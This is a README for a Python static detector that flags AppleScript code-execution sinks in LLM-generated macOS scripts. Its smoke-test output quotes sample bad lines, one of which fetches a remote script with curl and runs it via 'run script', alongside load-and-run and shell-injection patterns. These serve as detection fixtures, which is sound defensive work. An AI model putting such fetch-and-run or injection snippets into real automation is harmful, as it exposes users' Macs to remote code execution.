# llm-output-applescript-run-script-detector

Static detector for AppleScript dynamic-code-execution sinks. Targets LLM-generated automation scripts for macOS.

## Problem

AppleScript looks like a quaint English-prose DSL, but it has the same family of "execute a string as code" footguns as every other interpreted language — and worse, it cleanly bridges into the POSIX shell.

| Sink | Risk |
|------|------|
| `run script <expr>` | Compiles and executes an AppleScript source string at runtime. Full RCE inside the AppleScript host (Finder, System Events, etc.). |
| `do shell script <expr>` | Spawns `/bin/sh -c <expr>`. Direct shell injection. With `with administrator privileges` it escalates. |
| `load script <file>` | Loads a compiled `.scpt` from disk; combined with `run script` it lets attacker-supplied bytecode execute. |
| `osascript -e <expr>` (from inside `do shell script`) | A common LLM pattern: build an osascript invocation from string concat. |

LLMs producing macOS automation will frequently reach for `do shell script` because it is the path of least resistance for "just run this command". This detector flags those before the script ships.

## What the detector flags

- `run-script` — any `run script ...` form, including `run script ... with parameters {...}` and `run script ... as text`.
- `do-shell-script` — any `do shell script ...`.
- `load-script` — `load script ...` (paired with run-script in the canonical attack).
- `osascript-e` — `osascript -e` invocations (typically inside `do shell script`).

## What it deliberately does NOT flag

- The keywords appearing inside `--` line comments, `#` line comments, `(* ... *)` block comments, or `"..."` string literals.
- Pure declarative AppleScript with no runtime code-construction.

## Implementation notes

Single-pass scanner, python3 stdlib only. The masker tracks three lexer states across lines: `in_block` (sticky `(* ... *)`), `in_str` (resets per line), and "neither". `--` and `#` blank the rest of the line. Block comments persist across line boundaries via the returned `in_block` flag.

## Usage

```sh
python3 detect.py path/to/scripts/ one.applescript
```

Exit `1` on any finding, `0` otherwise.

## Live smoke test

```
$ python3 detect.py examples/bad/ examples/good/
examples/bad/01_run_script_user_input.applescript:2: [run-script] run script userCode
examples/bad/06_run_script_url.applescript:2: [run-script] run script theURL
examples/bad/02_run_remote_script.applescript:1: [do-shell-script] set fetched to do shell script "curl -s https://example.invalid/snippet.scpt"
examples/bad/02_run_remote_script.applescript:2: [run-script] run script fetched as text
examples/bad/04_load_then_run.applescript:1: [load-script] set scriptObj to load script POSIX file "/tmp/untrusted.scpt"
examples/bad/04_load_then_run.applescript:2: [run-script] run script scriptObj with parameters {"hello"}
examples/bad/05_osascript_e.applescript:1: [do-shell-script] do shell script "osascript -e " & quoted form of userExpr
examples/bad/03_do_shell_script_var.applescript:2: [do-shell-script] do shell script cmd
-- 8 finding(s)
$ echo $?
1
```

All 6 `examples/bad/*` files flag at least one sink; all 4 `examples/good/*` files (including ones with the keywords inside line comments, block comments, and string literals) report zero.

## Safe alternatives

| Instead of | Use |
|------------|-----|
| `run script userCode` | A fixed `if` / `tell application "X"` dispatch on a known enum |
| `do shell script (build cmd from var)` | `do shell script "/usr/local/bin/myhelper " & quoted form of arg` with a pinned binary and `quoted form of` on every variable |
| `load script` from a writable path | Load only from `/Library/Script Libraries/` with verified signatures |
| `osascript -e $x` | Write a static `.scpt` and call it by path with arguments |
